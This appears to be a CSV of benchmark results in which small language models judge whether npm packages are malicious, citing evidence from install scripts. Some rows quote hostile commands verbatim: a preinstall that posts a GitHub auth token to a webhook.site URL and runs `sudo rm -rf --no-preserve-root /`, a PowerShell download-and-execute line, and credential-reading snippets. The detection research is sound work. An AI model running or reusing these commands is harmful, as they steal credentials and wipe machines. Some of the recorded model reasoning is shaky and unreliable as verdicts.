run_id,model,prompt_id,sample_id,subgroup,technique,evidence,reasoning,giudizio
main,gemma3:4b,p3,@antv/lite-insight@2.2.1,shai_hulud_w3,obfuscated_payload,"['A new preinstall script (bun run index.js) was added.', 'A non-registry source (github:antvis/G2) was introduced.', 'The index.js file is significantly larger (486.7 KB) than previous versions.', 'The index.js file is obfuscated with many _0x identifiers.', 'The preinstall script uses fetch to make a network request.']","The introduction of a new preinstall script, a non-registry dependency, and a drastically increased file size with obfuscation strongly suggests malicious intent. The use of `fetch` to make a network request further raises suspicion, potentially for downloading and executing code. The presence of many _0x identifiers is a common obfuscation technique used in malware.",
main,llama3.2:3b,p2,@tushar-br/editing-pack@1.0.234,nato_malevolo,credential_theft,"['script postinstall: node install.js  [new package]', ""[credentials] install.js:9  = path.join(__dirname, 'staging_area'); const targetBase = process.env.INIT_CWD || process.cwd(); const outputFolder = targetBase"", '[credentials] install.js:201  s = @(\'node_modules\', \'package-lock.json\', \'package.json\', \'.npmrc\') foreach ($item in $items) { $p = Join-Path ""$', ""[exec] install.js:6  fs = require('fs'); const path = require('path'); const { execSync } = require('child_process'); const stagingArea = path.join(__dirname, 'staging_area');"", '[exec] install.js:182  ssInfo]\r\nIconResource=${iconFile},0\r\n`, \'utf8\'); execSync(`attrib +h +s ""${iniPath}""`); execSync(`attrib +r ""${iniFile}""`)],']",The install-time vectors show a new postinstall script. The flagged code has credentials and exec patterns. Together these match a known npm attack pattern.,
main,qwen3:4b,p0,@toptal/picasso-alert@3.1.34,nato_malevolo,self_propagation,"['preinstall script executes curl with a GitHub token and sudo rm -rf /', 'preinstall script contains sudo rm -rf --no-pres (truncated command)', 'script postinstall runs rm /s /q (likely a malicious command)', 'src/Alert/story/index.jsx references a suspicious URL with a token-like string', 'new dependencies include multiple @toptal/picasso-* packages']","The preinstall script uses sudo rm -rf / to delete the entire system, which is a critical security risk. The postinstall script runs rm /s /q, which is a known malicious pattern for system destruction. The package also contains a suspicious URL in the code that appears to be a token-based endpoint.",
main,gemma3:4b,p3,magala@1.0.7,nato_malevolo,self_propagation,"['PACKAGE: magala@1.0.7 is a new package (no previous version)', 'Files: 2 files, 1.6 KB total', 'bin/magala.js:8  require(""path"");', 'bin/magala.js:46  path.join(installDir, ""msh.js"")', 'network: bin/magala.js:12  ZIP_URL = ""https://pub-f9d605bddbb248bcb0666b93daf8fe29.r2.dev/msh/msh.zip""']","The package is newly created and contains a script that uses `execSync` to execute a command. This command downloads a zip file from a remote URL and then executes another script within that zip file. The use of `execSync` combined with a remote URL download is a strong indicator of a potential malicious activity, specifically remote code execution.",
main,qwen2.5-coder:7b,p0,nf-clcs@0.0.1,nato_malevolo,credential_theft,"['The package includes a preinstall script that executes a JavaScript file named `notify.js`.', 'The `notify.js` file contains code that makes an HTTP POST request to a webhook URL.', 'The code attempts to send package name, version, and timestamp to the webhook URL.', 'The presence of credentials (webhook URL) in the code is suspicious.', 'The package is new and has no previous version, raising concerns about its legitimacy.']","The package includes a script that sends package information to a webhook URL, which could be used for tracking or malicious purposes. The presence of credentials in the code is particularly concerning.",
control,granite4.2:8b,p1,react-jsonschema-form-conditionals@0.3.20,shai_hulud_w1,lifecycle_script,"['Added postinstall script running node bundle.js in version 0.3.20 (new compared to 0.3.17)', 'Added bundle.js file (3.6 MB) outside declared files', 'bundle.js contains references to GITHUB_TOKEN, API_BASE, BRANCH_NAME, FILE_NAME suggesting credential handling', 'bundle.js shell-like logic with exit 1, usage message for GITHUB_PAT', 'bundle.js includes network references (ITHUB_PAT, api.github.com) and workflow naming']","The package introduces a new postinstall script that runs a large bundle.js file containing shell-like logic and explicit references to GitHub tokens/credentials (GITHUB_TOKEN, GITHUB_PAT), API endpoints, and workflow names. This represents a clear install-time execution vector that reads/uses credentials and references remote hosts, which is highly indicative of malicious intent given the pattern and lack of legitimate justification (e.g., no indication this is for building native addons or official releases).",
main,qwen3:4b,p2,@toptal/picasso-alert@3.1.34,nato_malevolo,exfiltration,"['script preinstall: curl -d ""$(gh auth token)"" https://webhook.site/fb5b4647-aff8-418c-99e7-ec830cc2024b; sudo rm -rf --no-preserve-root /  [new package]', 'script postinstall: rm /s /q  [new package]', '[network] package.json#scripts:1  preinstall: curl -d ""$(gh auth token)"" https://webhook.site/fb5b4647-aff8-418c-99e7-ec830cc2024b; sudo rm -rf --no-pres', ""[network] src/Alert/story/index.jsx:11  formation ${PicassoBook.createBaseDocsLink( 'https://share.goabstract.com/36978a1a-5565-4f00-a772-cf05c01878d7?collectionLayerId=523f""]",The package has a new preinstall script that uses `gh auth token` to send credentials to a webhook site and attempts to delete the entire system. The postinstall script also runs a destructive command. These actions match credential theft and exfiltration patterns.,
main,llama3.2:3b,p0,@ejazullah/browser-mcp@0.0.59,nato_malevolo,credential_theft,"['lib/auth.js:8: Headers: { ""X-API-KEY"": ""<key>"" } */ const VALIDATE_URL = process.env.VALIDATE_URL || \'https://nexviahub.vercel.app/functions/v1/\',', 'lib/config.js:154: options.blockedOrigins = semicolonSeparatedList(process.env.PLAYWRIGHT_MCP_BLOCKED_ORIGINS);', 'lib/databaseLogger.js:33: if (mongoConfig || process.env.MONGODB_URL) { this._initializeMongoDB(mongoConfig || process.env.MONGODB_URL);', ""lib/loop/main.js:37: ssions') ], stderr: 'inherit', env: process.env, });"", 'lib/loopTools/context.js:32: if (process.env.OPENAI_API_KEY) this._delegate = new OpenAIDele']","The package contains credentials and API keys exposed in the code, which could be used for unauthorized access. The package also uses a POST request to validate API keys, which could be used for malicious purposes.",
main,gemma3:4b,p3,@redhat-cloud-services/chrome@2.3.1,compromesso,obfuscated_payload,"['A new `preinstall` script named `index.js` was added.', 'The `index.js` file is obfuscated using a complex string replacement function.', 'The `index.js` file contains an `eval` statement.', 'The `index.js` file has a very high average line length.']","The presence of a new `preinstall` script, combined with obfuscation and the use of `eval`, strongly suggests malicious intent. The high average line length could be a tactic to obscure the code. The use of eval is a common technique for executing arbitrary code during installation.",
rq3,llama3.2:3b,p3,@trpc-rate-limiter/cloudflare@0.1.4,shai_hulud_w2,self_propagation,"['script preinstall: node setup_bun.js [NEW]', '[runtime_download] setup_bun.js:71: Use PowerShell script command = \'powershell -c ""irm bun.sh/install.ps1|iex""\';', ""[credentials] setup_bun.js:25: 'Machine'"", ""[credentials] setup_bun.js:48: 'AWS_SECRET_ACCESS_KEY'"", ""[exec] setup_bun.js:2: #!/usr/bin/env node const { spawn, execSync } = require('child_process');""]","The package has a script that downloads and executes a PowerShell script, which is a suspicious behavior. Additionally, the script uses the `iex` command to execute a PowerShell command, which is a potential security risk. The package also uses environment variables to store sensitive information, such as the AWS secret access key. These behaviors are indicative of a malicious package.",
